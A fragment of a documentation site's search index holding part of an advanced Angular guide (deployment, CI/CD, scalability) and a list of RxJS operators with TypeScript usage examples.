FormGroup&lt;UserForm&gt;;\n\n  constructor(private fb: FormBuilder) {\n    this.userForm = this.fb.group({\n      name: ['', Validators.required],\n      email: ['', [Validators.required, Validators.email]],\n      age: [null, [Validators.required, Validators.min(18)]]\n    });\n  }\n\n  onSubmit() {\n    if (this.userForm.valid) {\n      const userData: UserForm = this.userForm.value;\n      // Handle user data\n    }\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#e-enhanced-compiler-and-tooling","title":"e. Enhanced Compiler and Tooling","text":"<p>Description: Angular 16 brings performance improvements to the compiler, reducing build times and enhancing the overall developer experience.</p> <p>Benefits: - Faster Builds: Quicker iterations during development. - Better Optimization: Enhanced tree shaking and code minification.</p>"},{"location":"angular/expert/#f-advanced-directive-capabilities","title":"f. Advanced Directive Capabilities","text":"<p>Description: Introduces more powerful directive features, allowing for more dynamic and flexible component behaviors.</p> <p>Example: Structural Directives with Enhanced Capabilities <pre><code>// unless.directive.ts\nimport { Directive, Input, TemplateRef, ViewContainerRef } from '@angular/core';\n\n@Directive({\n  selector: '[appUnless]'\n})\nexport class UnlessDirective {\n  private hasView = false;\n\n  constructor(private templateRef: TemplateRef&lt;any&gt;, private vc: ViewContainerRef) {}\n\n  @Input() set appUnless(condition: boolean) {\n    if (!condition &amp;&amp; !this.hasView) {\n      this.vc.createEmbeddedView(this.templateRef);\n      this.hasView = true;\n    } else if (condition &amp;&amp; this.hasView) {\n      this.vc.clear();\n      this.hasView = false;\n    }\n  }\n}\n</code></pre></p> <p>Usage: <pre><code>&lt;div *appUnless=\"isLoggedIn\"&gt;Please log in to continue.&lt;/div&gt;\n</code></pre></p>"},{"location":"angular/expert/#16-deployment-and-continuous-integration","title":"16. Deployment and Continuous Integration","text":"<p>Deploying Angular applications efficiently ensures that updates are delivered seamlessly and reliably to end-users. Implementing Continuous Integration (CI) and Continuous Deployment (CD) pipelines automates the build, test, and deployment processes.</p>"},{"location":"angular/expert/#a-building-for-production","title":"a. Building for Production","text":"<p>Description: Prepare the application for deployment by optimizing the build output.</p> <p>Command: <pre><code>ng build --prod\n</code></pre></p> <p>Options: - AOT Compilation: Enabled by default in production builds. - Optimization: Minifies and compresses code. - Budgets: Set size limits to enforce optimal bundle sizes.</p> <p>Example: <pre><code>ng build --configuration=production\n</code></pre></p>"},{"location":"angular/expert/#b-hosting-options","title":"b. Hosting Options","text":"<p>Popular Hosting Solutions: - Firebase Hosting: Fast and secure hosting for web apps. - Netlify: Continuous deployment and hosting with easy integration. - AWS S3 and CloudFront: Scalable storage and CDN delivery. - Azure Static Web Apps: Integrated hosting with Azure services. - Heroku: Simplified deployment for full-stack applications.</p>"},{"location":"angular/expert/#c-configuring-environment-variables","title":"c. Configuring Environment Variables","text":"<p>Description: Manage different configurations for various environments (development, staging, production).</p> <p>Implementation: Use Angular's environment files to define environment-specific variables.</p> <pre><code>// environment.prod.ts\nexport const environment = {\n  production: true,\n  apiEndpoint: 'https://api.production.com'\n};\n</code></pre> <pre><code>// environment.ts\nexport const environment = {\n  production: false,\n  apiEndpoint: 'http://localhost:3000'\n};\n</code></pre> <p>Usage in Services: <pre><code>import { Injectable } from '@angular/core';\nimport { HttpClient } from '@angular/common/http';\nimport { environment } from '../environments/environment';\n\n@Injectable({ providedIn: 'root' })\nexport class DataService {\n  private api = environment.apiEndpoint;\n\n  constructor(private http: HttpClient) {}\n\n  getData() {\n    return this.http.get(`${this.api}/data`);\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#d-continuous-integration-with-github-actions","title":"d. Continuous Integration with GitHub Actions","text":"<p>Description: Automate the build and testing processes using GitHub Actions.</p> <p>Example Workflow: <pre><code># .github/workflows/ci.yml\nname: CI\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: actions/checkout@v2\n    - name: Setup Node.js\n      uses: actions/setup-node@v2\n      with:\n        node-version: '16'\n    - name: Install Dependencies\n      run: npm install\n    - name: Run Lint\n      run: npm run lint\n    - name: Run Unit Tests\n      run: npm run test -- --watch=false --browsers=ChromeHeadless\n    - name: Build\n      run: npm run build -- --prod\n    - name: Upload Artifact\n      uses: actions/upload-artifact@v2\n      with:\n        name: build\n        path: dist/\n</code></pre></p>"},{"location":"angular/expert/#e-continuous-deployment-with-netlify","title":"e. Continuous Deployment with Netlify","text":"<p>Description: Deploy the built Angular application to Netlify for continuous deployment.</p> <p>Steps: 1. Connect Repository: Link your GitHub repository to Netlify. 2. Configure Build Settings:    - Build Command: <code>ng build --prod</code>    - Publish Directory: <code>dist/my-advanced-app</code> 3. Deploy: Netlify automatically builds and deploys the application on each push to the specified branch.</p>"},{"location":"angular/expert/#f-server-configuration-for-spa-routing","title":"f. Server Configuration for SPA Routing","text":"<p>Description: Configure the server to redirect all routes to <code>index.html</code>, ensuring proper routing in single-page applications.</p> <p>Example with Nginx: <pre><code>server {\n  listen 80;\n  server_name example.com;\n\n  root /var/www/my-advanced-app/dist/my-advanced-app;\n  index index.html;\n\n  location / {\n    try_files $uri $uri/ /index.html;\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#g-environment-specific-configurations","title":"g. Environment-Specific Configurations","text":"<p>Description: Maintain different configurations for various deployment environments to manage API endpoints, feature flags, and other settings.</p> <p>Best Practices: - Use Separate Environment Files: Define configurations in <code>environment.ts</code>, <code>environment.prod.ts</code>, etc. - Secure Sensitive Data: Do not expose sensitive information in client-side environment files. Use server-side proxies or secure storage mechanisms.</p>"},{"location":"angular/expert/#17-scalability-strategies","title":"17. Scalability Strategies","text":"<p>Ensuring that Angular applications can scale to handle increased traffic, data volume, and feature complexity is vital for long-term success.</p>"},{"location":"angular/expert/#a-modular-architecture_1","title":"a. Modular Architecture","text":"<p>Description: Break down the application into feature modules, promoting separation of concerns and facilitating lazy loading.</p> <p>Benefits: - Enhanced Maintainability: Easier to manage and understand. - Improved Performance: Load modules on demand, reducing initial load time.</p>"},{"location":"angular/expert/#b-lazy-loading","title":"b. Lazy Loading","text":"<p>Description: Load feature modules only when needed, improving application performance and reducing bundle sizes.</p> <p>Implementation: Define lazy-loaded routes in the routing module.</p> <pre><code>// app-routing.module.ts\nconst routes: Routes = [\n  {\n    path: 'dashboard',\n    loadChildren: () =&gt; import('./dashboard/dashboard.module').then(m =&gt; m.DashboardModule)\n  },\n  // ... other routes\n];\n</code></pre>"},{"location":"angular/expert/#c-shared-and-core-modules","title":"c. Shared and Core Modules","text":"<p>Description: Utilize Shared Modules for reusable components and Core Modules for singleton services, reducing duplication and promoting reusability.</p> <p>Benefits: - Consistency: Ensure uniformity across different parts of the application. - Efficiency: Avoid redundant code and dependencies.</p>"},{"location":"angular/expert/#d-state-management","title":"d. State Management","text":"<p>Description: Implement efficient state management solutions (e.g., NgRx, Akita) to handle complex application states, enabling predictable data flow and easier debugging.</p> <p>Benefits: - Scalability: Manage growing application states effectively. - Maintainability: Simplify state-related code, enhancing readability and testability.</p>"},{"location":"angular/expert/#e-optimizing-change-detection","title":"e. Optimizing Change Detection","text":"<p>Description: Use strategies like <code>OnPush</code> change detection and immutable data patterns to minimize unnecessary change detection cycles, improving performance.</p>"},{"location":"angular/expert/#f-code-splitting-and-bundling","title":"f. Code Splitting and Bundling","text":"<p>Description: Split the application into smaller bundles using Angular's built-in capabilities, enabling parallel loading and reducing load times.</p> <p>Benefits: - Faster Load Times: Users download only the necessary code. - Optimized Resource Usage: Efficiently manage bandwidth and client resources.</p>"},{"location":"angular/expert/#g-server-side-rendering-ssr","title":"g. Server-Side Rendering (SSR)","text":"<p>Description: Implement SSR using Angular Universal to improve initial load times and SEO, especially beneficial for content-rich applications.</p>"},{"location":"angular/expert/#h-progressive-web-app-pwa-enhancements","title":"h. Progressive Web App (PWA) Enhancements","text":"<p>Description: Utilize PWA features like caching, offline support, and push notifications to enhance user experience and engagement.</p>"},{"location":"angular/expert/#i-performance-monitoring-and-profiling","title":"i. Performance Monitoring and Profiling","text":"<p>Description: Continuously monitor application performance using tools like Google Lighthouse, WebPageTest, and browser developer tools to identify and address performance bottlenecks.</p> <p>Best Practices: - Regular Audits: Perform periodic performance audits. - Automate Monitoring: Integrate performance monitoring into CI/CD pipelines.</p>"},{"location":"angular/expert/#j-optimizing-asset-delivery","title":"j. Optimizing Asset Delivery","text":"<p>Description: Serve assets like images, fonts, and videos efficiently using techniques like compression, lazy loading, and CDN delivery.</p> <p>Best Practices: - Use Modern Image Formats: Utilize formats like WebP for better compression. - Implement Lazy Loading: Load images and assets only when they enter the viewport. - Leverage CDNs: Distribute assets globally for faster access.</p>"},{"location":"angular/expert/#18-best-practices-summary","title":"18. Best Practices Summary","text":"<ul> <li>Adopt Modular Architecture: Organize the application into feature, core, and shared modules for better scalability and maintainability.</li> <li>Leverage State Management: Implement robust state management solutions like NgRx or Akita to handle complex application states predictably.</li> <li>Optimize Performance: Utilize strategies like lazy loading, OnPush change detection, and code splitting to enhance application performance.</li> <li>Ensure Security: Follow Angular's security best practices to protect against common vulnerabilities like XSS and CSRF.</li> <li>Implement Comprehensive Testing: Combine unit, integration, and E2E tests to ensure application reliability and maintainability.</li> <li>Utilize Latest Features: Stay updated with Angular's latest features (e.g., standalone components, improved signals) to leverage enhanced capabilities and performance improvements.</li> <li>Plan for Scalability: Design the application to handle growth in data volume, user traffic, and feature complexity through effective architectural decisions and optimization techniques.</li> <li>Maintain Code Quality: Enforce coding standards, perform regular code reviews, and use linting tools to maintain high code quality.</li> <li>Automate Deployment: Implement CI/CD pipelines to streamline the build, test, and deployment processes, reducing errors and accelerating delivery.</li> <li>Monitor and Profile: Continuously monitor application performance and health, addressing issues proactively to ensure a seamless user experience.</li> </ul> <p>Conclusion:</p> <p>Mastering Angular involves not only understanding its core concepts but also leveraging advanced features and best practices to build high-performance, secure, and scalable applications. By implementing the strategies outlined in this guide, developers can harness Angular's full potential, ensuring their applications are robust, maintainable, and capable of meeting complex business requirements.</p>"},{"location":"angular/rxjs/","title":"Rxjs","text":""},{"location":"angular/rxjs/#full-list-of-rxjs-operators-with-examples","title":"Full List of RxJS Operators with Examples","text":""},{"location":"angular/rxjs/#1-distinctuntilchanged","title":"1. distinctUntilChanged","text":"<ul> <li>Basic: Emit only if the current value is different from the previous.</li> <li>Advanced: Use it to compare complex objects.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { distinctUntilChanged } from 'rxjs/operators';\n\n// Basic usage\nof(1, 1, 2, 2, 3, 1, 3)\n  .pipe(distinctUntilChanged())\n  .subscribe(console.log); // Output: 1, 2, 3, 1, 3\n\n// Advanced usage (comparing object properties)\nof(\n  { id: 1, name: 'Alice' },\n  { id: 2, name: 'Alice' },\n  { id: 2, name: 'Bob' }\n)\n.pipe(distinctUntilChanged((prev, curr) =&gt; prev.id === curr.id))\n.subscribe(console.log); // Output: {id: 1, name: 'Alice'}, {id: 2, name: 'Alice'}\n</code></pre>"},{"location":"angular/rxjs/#2-map","title":"2. map","text":"<ul> <li>Basic: Transform each value emitted by the source.</li> <li>Advanced: Use it to transform API responses.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { map } from 'rxjs/operators';\n\n// Basic usage\nof(1, 2, 3).pipe(map(value =&gt; value * 2)).subscribe(console.log); // Output: 2, 4, 6\n\n// Advanced usage (transforming an API response)\nof({ data: { user: { id: 1, name: 'Alice' } } })\n  .pipe(map(response =&gt; response.data.user.name))\n  .subscribe(console.log); // Output: 'Alice'\n</code></pre>"},{"location":"angular/rxjs/#3-switchmap","title":"3. switchMap","text":"<ul> <li>Basic: Map each value to a new observable, canceling previous.</li> <li>Advanced: Use in search auto-completion.</li> </ul> <pre><code>import { of, interval } from 'rxjs';\nimport { switchMap, take } from 'rxjs/operators';\n\n// Basic usage\nof('first', 'second')\n  .pipe(switchMap(val =&gt; interval(1000).pipe(take(2))))\n  .subscribe(console.log); // Cancels 'first', emits 0, 1 for 'second'\n\n// Advanced usage (search auto-complete)\nconst searchInput$ = of('apple', 'app', 'apple pie');\nsearchInput$\n  .pipe(\n    switchMap(query =&gt; fakeApiSearch(query)) // Cancel previous search if a new one occurs\n  )\n  .subscribe(console.log);\n\nfunction fakeApiSearch(query: string) {\n  console.log(`Searching for ${query}`);\n  return of(`Results for ${query}`);\n}\n</code></pre>"},{"location":"angular/rxjs/#4-combinelatest","title":"4. combineLatest","text":"<ul> <li>Basic: Combine latest values from multiple observables.</li> <li>Advanced: Synchronize multiple fields in a form.</li> </ul> <pre><code>import { of, combineLatest } from 'rxjs';\n\n// Basic usage\nconst obs1$ = of(1, 2, 3);\nconst obs2$ = of('A', 'B', 'C');\ncombineLatest([obs1$, obs2$]).subscribe(console.log); // Output: [3, 'C']\n\n// Advanced usage (synchronizing form fields)\nconst firstName$ = of('John');\nconst lastName$ = of('Doe');\ncombineLatest([firstName$, lastName$])\n  .pipe(map(([first, last]) =&gt; `${first} ${last}`))\n  .subscribe(console.log); // Output: 'John Doe'\n</code></pre>"},{"location":"angular/rxjs/#5-mergemap","title":"5. mergeMap","text":"<ul> <li>Basic: Map each value to an observable and merge results.</li> <li>Advanced: Perform parallel requests and combine their results.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { mergeMap } from 'rxjs/operators';\n\n// Basic usage\nof('A', 'B')\n  .pipe(mergeMap(val =&gt; of(`${val}1`, `${val}2`)))\n  .subscribe(console.log); // Output: 'A1', 'A2', 'B1', 'B2'\n\n// Advanced usage (parallel requests)\nconst userIds$ = of(1, 2, 3);\nuserIds$\n  .pipe(\n    mergeMap(id =&gt; fetchUser(id)) // Fetches users in parallel\n  )\n  .subscribe(console.log);\n\nfunction fetchUser(id: number) {\n  return of(`User ${id}`); // Simulates fetching user by ID\n}\n</code></pre>"},{"location":"angular/rxjs/#6-debouncetime","title":"6. debounceTime","text":"<ul> <li>Basic: Delay emissions for a set time.</li> <li>Advanced: Use in a search field to limit API calls.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { debounceTime } from 'rxjs/operators';\n\n// Basic usage\nof(1, 2, 3)\n  .pipe(debounceTime(1000))\n  .subscribe(console.log); // Emits only after 1 second delay\n\n// Advanced usage (debouncing API calls)\nconst userInput$ = of('search term');\nuserInput$\n  .pipe(debounceTime(300)) // Delay API call until typing stops\n  .subscribe(query =&gt; performSearch(query));\n\nfunction performSearch(query: string) {\n  console.log(`Searching for: ${query}`);\n}\n</code></pre>"},{"location":"angular/rxjs/#7-takeuntil","title":"7. takeUntil","text":"<ul> <li>Basic: Take values until another observable emits.</li> <li>Advanced: Auto-unsubscribe on component destruction.</li> </ul> <pre><code>import { interval, Subject } from 'rxjs';\nimport { takeUntil } from 'rxjs/operators';\n\n// Basic usage\nconst source$ = interval(1000);\nconst stop$ = new Subject();\nsource$.pipe(takeUntil(stop$)).subscribe(console.log);\n\nsetTimeout(() =&gt; stop$.next(), 5000); // Stops after 5 seconds\n\n// Advanced usage (auto-unsubscribe in Angular component)\nclass MyComponent {\n  private destroy$ = new Subject();\n\n  ngOnInit() {\n    interval(1000)\n      .pipe(takeUntil(this.destroy$))\n      .subscribe(console.log);\n  }\n\n  ngOnDestroy() {\n    this.destroy$.next();\n    this.destroy$.complete();\n  }\n}\n</code></pre>"},{"location":"angular/rxjs/#8-catcherror","title":"8. catchError","text":"<ul> <li>Basic: Handle errors in an observable.</li> <li>Advanced: Retry on failure, then handle error if retries fail.</li> </ul> <pre><code>import { of, throwError } from 'rxjs';\nimport { catchError, retry } from 'rxjs/operators';\n\n// Basic usage\nthrowError('Error!')\n  .pipe(catchError(err =&gt; of(`Caught: ${err}`)))\n  .subscribe(console.log); // Output: 'Caught: Error!'\n\n// Advanced usage (retry and then handle error)\nof('Request')\n  .pipe(\n    mergeMap(_ =&gt; throwError('Network error')), // Simulate network error\n    retry(3), // Retry up to 3 times\n    catchError(err =&gt; of(`Failed after retries: ${err}`))\n  )\n  .subscribe(console.log); // Output after retries fail: 'Failed after retries: Network error'\n</code></pre>"},{"location":"angular/rxjs/#9-concatmap","title":"9. concatMap","text":"<ul> <li>Basic: Map each value to an observable, preserving order.</li> <li>Advanced: Queue API calls to avoid rate limits.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { concatMap, delay } from 'rxjs/operators';\n\n// Basic usage\nof('A', 'B', 'C')\n  .pipe(concatMap(val =&gt; of(`${val}1`).pipe(delay(1000))))\n  .subscribe(console.log); // Output: 'A1', 'B1', 'C1' with 1 second delay between\n\n// Advanced usage (rate-limiting API requests)\nconst requestQueue$ = of('Request 1', 'Request 2', 'Request 3');\nrequestQueue$\n  .pipe(\n    concatMap(request =&gt; fakeApiRequest(request)) // Processes each request sequentially\n  )\n  .subscribe(console.log);\n\nfunction fakeApiRequest(req: string) {\n  console.log(`Processing ${req}`);\n  return of(`${req} processed`).pipe(delay(1000)); // Simulates 1-second API response\n}\n</code></pre>"},{"location":"angular/rxjs/#10-exhaustmap","title":"10. exhaustMap","text":"<ul> <li>Basic: Ignore new values if a previous observable is still active.</li> <li>Advanced: Prevent multiple clicks on a button from causing repeated requests.</li> </ul> <pre><code>import { of, interval } from 'rxjs';\nimport { exhaustMap, take } from 'rxjs/operators';\n\n// Basic usage\nof('A', 'B')\n  .pipe(exhaustMap(val =&gt; interval(1000).pipe(take(2))))\n  .subscribe(console.log); // Ignores 'B' since 'A' is not complete\n\n// Advanced usage (button click prevention)\nconst buttonClick$ = of('click');\nbuttonClick$\n  .pipe(\n    exhaustMap(() =&gt; fakeLongRequest()) // Ignores further clicks until request completes\n  )\n  .subscribe(console.log);\n\nfunction fakeLongRequest() {\n  return of('Request complete').pipe(delay(2000)); // Simulates long request\n}\n</code></pre>"},{"location":"angular/rxjs/#11-tap","title":"11. tap","text":"<ul> <li>Basic: Perform side effects without altering emitted values.</li> <li>Advanced: Log values for debugging and analytics.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { tap, map } from 'rxjs/operators';\n\n// Basic usage\nof(1, 2, 3)\n  .pipe(\n    tap(val =&gt; console.log(`Before map: ${val}`)),\n    map(val =&gt; val * 10),\n    tap(val =&gt; console.log(`After map: ${val}`))\n  )\n  .subscribe(console.log);\n\n// Advanced usage (logging analytics)\nof('page_view', 'button_click')\n  .pipe(\n    tap(event =&gt; logToAnalytics(event)) // Send event to analytics before further processing\n  )\n  .subscribe();\n\nfunction logToAnalytics(event: string) {\n  console.log(`Logging event: ${event}`);\n}\n</code></pre>"},{"location":"angular/rxjs/#12-withlatestfrom","title":"12. withLatestFrom","text":"<ul> <li>Basic: Combine values with the latest from another observable only when the source emits.</li> <li>Advanced: Combine user input with the latest API data.</li> </ul> <pre><code>import { of, interval } from 'rxjs';\nimport { withLatestFrom, map } from 'rxjs/operators';\n\n// Basic usage\nconst source$ = interval(1000);\nconst latest$ = of(5);\nsource$\n  .pipe(\n    withLatestFrom(latest$),\n    map(([source, latest]) =&gt; source + latest)\n  )\n  .subscribe(console.log); // Outputs combined values\n\n// Advanced usage (combine input with latest API data)\nconst userInput$ = of('search term');\nconst latestResults$ = of('API result');\nuserInput$\n  .pipe(\n    withLatestFrom(latestResults$), // Combines input with latest API data\n    map(([input, results]) =&gt; `User searched: ${input}, Results: ${results}`)\n  )\n  .subscribe(console.log);\n</code></pre>"},{"location":"angular/rxjs/#13-startwith","title":"13. startWith","text":"<ul> <li>Basic: Emit an initial value before actual source values.</li> <li>Advanced: Provide a default value for loading state.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { startWith } from 'rxjs/operators';\n\n// Basic usage\nof('A', 'B', 'C')\n  .pipe(startWith('Start'))\n  .subscribe(console.log); // Output: 'Start', 'A', 'B', 'C'\n\n// Advanced usage (loading state)\nconst data$ = of('Data loaded');\ndata$\n  .pipe(startWith('Loading...'))\n  .subscribe(console.log); // Output: 'Loading...', 'Data loaded'\n</code></pre>"},{"location":"angular/rxjs/#14-share","title":"14. share","text":"<ul> <li>Basic: Share the same observable among subscribers.</li> <li>Advanced: Avoid multiple HTTP calls by sharing API response.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { share, map } from 'rxjs/operators';\n\n// Basic usage\nconst shared$ = of('Shared data').pipe(share());\nshared$.subscribe(console.log); // Output: 'Shared data' (only called once)\n\n// Advanced usage (shared API response)\nconst apiResponse$ = of({ id: 1, name: 'Alice' }).pipe(share());\napiResponse$.subscribe(console.log); // First subscriber\napiResponse$.subscribe(console.log); // Second subscriber, no new request\n</code></pre>"},{"location":"angular/rxjs/#15-retrywhen","title":"15. retryWhen","text":"<ul> <li>Basic: Retry on error based on custom logic.</li> <li>Advanced: Exponential backoff on retry.</li> </ul> <pre><code>import { of, throwError, timer } from 'rxjs';\nimport { retryWhen, delay, mergeMap } from 'rxjs/operators';\n\n// Basic usage\nthrowError('Error!')\n  .pipe(\n    retryWhen(errors =&gt;\n      errors.pipe(delay(1000)) // Retry after 1 second on error\n    )\n  )\n  .subscribe(console.log, console.error);\n\n// Advanced usage (exponential backoff)\nconst source$ = throwError('Network error');\nsource$\n  .pipe(\n    retryWhen(errors =&gt;\n      errors.pipe(\n        mergeMap((error, i) =&gt; {\n          const retryAttempt = i + 1;\n          if (retryAttempt &gt; 3) {\n            return throwError(`Failed after ${retryAttempt} attempts`);\n          }\n          console.log(`Retrying in ${retryAttempt} second(s)...`);\n          return timer(retryAttempt * 1000); // Exponential delay\n        })\n      )\n    )\n  )\n  .subscribe(console.log, console.error);\n</code></pre>"},{"location":"angular/rxjs/#16-zip","title":"16. zip","text":"<ul> <li>Basic: Combine values from multiple observables into tuples.</li> <li>Advanced: Wait for paired data from different sources.</li> </ul> <pre><code>import { of, zip } from 'rxjs';\n\n// Basic usage\nconst obs1$ = of(1, 2, 3);\nconst obs2$ = of('A', 'B', 'C');\nzip(obs1$, obs2$).subscribe(console.log); // Output: [1, 'A'], [2, 'B'], [3, 'C']\n\n// Advanced usage (paired data from different sources)\nconst ids$ = of(101, 102, 103);\nconst names$ = of('Alice', 'Bob', 'Charlie');\nzip(ids$, names$)\n  .pipe(map(([id, name]) =&gt; ({ id, name })))\n  .subscribe(console.log); // Output: { id: 101, name: 'Alice' }, etc.\n</code></pre>"},{"location":"angular/rxjs/#17-reduce","title":"17. reduce","text":"<ul> <li>Basic: Accumulate values into a single result and emit it on completion.</li> <li>Advanced: Calculate totals or summaries from a stream of values.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { reduce } from 'rxjs/operators';\n\n// Basic usage\nof(1, 2, 3, 4)\n  .pipe(reduce((acc, value) =&gt; acc + value, 0))\n  .subscribe(console.log); // Output: 10 (sum of values)\n\n// Advanced usage (calculate total cost of items)\nconst items$ = of({ price: 10 }, { price: 15 }, { price: 20 });\nitems$\n  .pipe(reduce((acc, item) =&gt; acc + item.price, 0))\n  .subscribe(console.log); // Output: 45 (total price)\n</code></pre>"},{"location":"angular/rxjs/#18-scan","title":"18. scan","text":"<ul> <li>Basic: Accumulate values over time and emit each intermediate result.</li> <li>Advanced: Track running totals or maintain state over time.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { scan } from 'rxjs/operators';\n\n// Basic usage\nof(1, 2, 3)\n  .pipe(scan((acc, value) =&gt; acc + value, 0))\n  .subscribe(console.log); // Output: 1, 3, 6 (running total)\n\n// Advanced usage (track user score over time)\nconst scoreChanges$ = of(10, -5, 15);\nscoreChanges$\n  .pipe(scan((totalScore, change) =&gt; totalScore + change, 0))\n  .subscribe(console.log); // Output: 10, 5, 20 (score progress)\n</code></pre>"},{"location":"angular/rxjs/#19-delaywhen","title":"19. delayWhen","text":"<ul> <li>Basic: Delay emissions based on another observable.</li> <li>Advanced: Delay API calls based on user actions.</li> </ul> <pre><code>import { of, timer } from 'rxjs';\nimport { delayWhen } from 'rxjs/operators';\n\n// Basic usage\nof('A', 'B', 'C')\n  .pipe(delayWhen(() =&gt; timer(1000))) // Delays each by 1 second\n  .subscribe(console.log);\n\n// Advanced usage (wait until user confirms before making an API call)\nconst apiCall$ = of('API call result');\nconst userConfirmed$ = timer(3000); // Simulate 3-second delay for user confirmation\napiCall$\n  .pipe(delayWhen(() =&gt; userConfirmed$))\n  .subscribe(console.log); // Only emits after userConfirmed$ completes\n</code></pre>"},{"location":"angular/rxjs/#20-partition","title":"20. partition","text":"<ul> <li>Basic: Split values into two groups based on a condition.</li> <li>Advanced: Separate even and odd values or filter errors vs. success responses.</li> </ul> <pre><code>import { of, partition } from 'rxjs';\n\n// Basic usage\nconst [evens$, odds$] = partition(of(1, 2, 3, 4, 5), value =&gt; value % 2 === 0);\nevens$.subscribe(val =&gt; console.log('Even:', val)); // Output: 2, 4\nodds$.subscribe(val =&gt; console.log('Odd:', val));   // Output: 1, 3, 5\n\n// Advanced usage (separating success and error responses)\nconst responses$ = of({ success: true, data: 'A' }, { success: false, error: 'Error' });\nconst [success$, error$] = partition(responses$, res =&gt; res.success);\n\nsuccess$.subscribe(res =&gt; console.log('Success:', res.data)); // Output: 'A'\nerror$.\n</code></pre>"},{"location":"angular/rxjs/#21-groupby","title":"21. groupBy","text":"<ul> <li>Basic: Group values by a key and process each group individually.</li> <li>Advanced: Create group summaries (e.g., total cost by category).</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { groupBy, mergeMap, reduce } from 'rxjs/operators';\n\n// Basic usage\nof(\n  { id: 1, category: 'A' },\n  { id: 2, category: 'B' },\n  { id: 3, category: 'A' }\n)\n  .pipe(\n    groupBy(item =&gt; item.category),\n    mergeMap(group$ =&gt; group$.pipe(reduce((acc, cur) =&gt; [...acc, cur], [])))\n  )\n  .subscribe(console.log); // Output: [{id: 1, ...}, {id: 3, ...}], [{id: 2, ...}]\n\n// Advanced usage (calculate total by category)\nconst items$ = of(\n  { category: 'fruit', price: 1 },\n  { category: 'vegetable', price: 2 },\n  { category: 'fruit', price: 3 }\n);\nitems$\n  .pipe(\n    groupBy(item =&gt; item.category),\n    mergeMap(group$ =&gt;\n      group$.pipe(\n        reduce((acc, item) =&gt; acc + item.price, 0),\n        mergeMap(total =&gt; of({ category: group$.key, total }))\n      )\n    )\n  )\n  .subscribe(console.log); // Output: {category: 'fruit', total: 4}, {category: 'vegetable', total: 2}\n</code></pre>"},{"location":"angular/rxjs/#22-buffertime","title":"22. bufferTime","text":"<ul> <li>Basic: Collect values within a time window and emit as an array.</li> <li>Advanced: Group multiple quick user inputs into a batch for processing.</li> </ul> <pre><code>import { interval } from 'rxjs';\nimport { bufferTime } from 'rxjs/operators';\n\n// Basic usage\ninterval(500)\n  .pipe(bufferTime(2000))\n  .subscribe(console.log); // Output: [0,1,2,...] every 2 seconds\n\n// Advanced usage (batching user inputs)\nconst userInput$ = interval(500).pipe(bufferTime(2000));\nuserInput$.subscribe(batch =&gt; {\n  console.log(`Processing batch:`, batch);\n  // Process inputs as a single batch\n});\n</code></pre>"},{"location":"angular/rxjs/#23-windowcount","title":"23. windowCount","text":"<ul> <li>Basic: Emit windows of values based on count, outputting observables.</li> <li>Advanced: Apply cumulative calculations to batches of values.</li> </ul> <pre><code>import { interval } from 'rxjs';\nimport { windowCount, mergeMap, reduce } from 'rxjs/operators';\n\n// Basic usage\ninterval(500)\n  .pipe(\n    windowCount(3),\n    mergeMap(window$ =&gt; window$.pipe(reduce((acc, val) =&gt; [...acc, val], [])))\n  )\n  .subscribe(console.log); // Output: [0,1,2], [3,4,5], etc.\n\n// Advanced usage (calculate batch totals)\ninterval(500)\n  .pipe(\n    windowCount(5),\n    mergeMap(window$ =&gt;\n      window$.pipe(reduce((acc, value) =&gt; acc + value, 0)) // Sum of each 5-value window\n    )\n  )\n  .subscribe(console.log); // Output: 10, 35, 60, etc. (sum of each window)\n</code></pre>"},{"location":"angular/rxjs/#24-pairwise","title":"24. pairwise","text":"<ul> <li>Basic: Emit pairs of consecutive values.</li> <li>Advanced: Detect value changes and apply transformation based on previous value.</li> </ul> <pre><code>import { of } from 'rxjs';\nimport { pairwise } from 'rxjs/operators';\n\n// Basic usage\nof(1, 2, 3, 4)\n  .pipe(pairwise())\n  .subscribe(console.log); // Output: [1, 2], [2, 3], [3, 4]\n\n// Advanced usage (detect upward/downward trends)\nof(100, 101, 105, 102, 108)\n  .pipe(\n    pairwise(),\n    map(([prev, curr]) =&gt; (curr &gt; prev ? 'up' : 'down'))\n  )\n  .subscribe(console.log); // Output: 'up', 'up', 'down', 'up'\n</code></pre>"},{"location":"angular/rxjs/#25-throttletime","title":"25. throttleTime","text":"<ul> <li>Basic: Limit the rate of emitted values within a time frame.</li> <li>Advanced: Use in scroll events to reduce API calls.</li> </ul> <pre><code>import { fromEvent } from 'rxjs';\nimport { throttleTime } from 'rxjs/operators';\n\n// Basic usage\nconst clicks$ = fromEvent(document, 'click');\nclicks$.pipe(throttleTime(1000)).subscribe(console.log); // Emits clicks every 1 second\n\n// Advanced usage (scroll events for infinite loading)\nconst scroll$ = fromEvent(window, 'scroll');\nscroll$\n  .pipe(throttleTime(500))\n  .subscribe(() =&gt; {\n    // Load more content if scrolled near bottom\n    if (window.innerHeight + window.scrollY &gt;= document.body.offsetHeight) {\n      console.log('Load more content');\n    }\n  });\n</code></pre>"},{"location":"angular/rxjs/#26-fromevent","title":"26. fromEvent","text":"<ul> <li>Usage: Creates an Observable that emits events of a specific type from an Angular component template element.</li> <li>Example:     <pre><code>import { Component, ElementRef, ViewChild, AfterViewInit } from '@angular/core';\nimport { fromEvent } from 'rxjs';\n\n@Component({\n  selector: 'app-example',\n  template: `&lt;button #myButton&gt;Click Me&lt;/button&gt;`\n})\nexport class ExampleComponent implements AfterViewInit {\n  @ViewChild('myButton', { static: true }) button!: ElementRef;\n\n  ngAfterViewInit(): void {\n    fromEvent(this.button.nativeElement, 'click').subscribe(() =&gt; {\n      console.log('Button clicked!');\n    });\n  